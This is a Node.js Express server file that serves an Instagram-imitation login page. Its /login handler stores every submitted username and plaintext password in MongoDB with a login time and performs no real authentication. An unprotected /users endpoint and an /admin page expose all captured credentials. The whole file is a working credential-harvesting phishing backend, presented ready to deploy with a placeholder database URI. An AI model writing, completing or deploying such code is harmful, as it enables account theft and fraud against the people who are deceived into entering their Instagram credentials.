const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// MongoDB Connection (paste your MongoDB Atlas URI in .env or replace below)
const MONGO_URI = process.env.MONGO_URI || 'YOUR_MONGODB_ATLAS_URI_HERE';

mongoose.connect(MONGO_URI)
  .then(() => console.log('✅ MongoDB connected!'))
  .catch(err => console.error('❌ MongoDB error:', err.message));

// User Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  login_time: String
});

const User = mongoose.model('User', userSchema);

// POST /login — save credentials
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, message: 'Missing fields' });

  try {
    const user = new User({
      username,
      password,
      login_time: new Date().toLocaleString()
    });
    await user.save();
    res.json({ success: true, id: user._id });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /users — view all saved users (admin only)
app.get('/users', async (req, res) => {
  try {
    const users = await User.find().sort({ _id: -1 });
    res.json({ success: true, total: users.length, users });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'instagram-login.html'));
});

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
  console.log(`👁️  Admin panel: http://localhost:${PORT}/admin`);
});
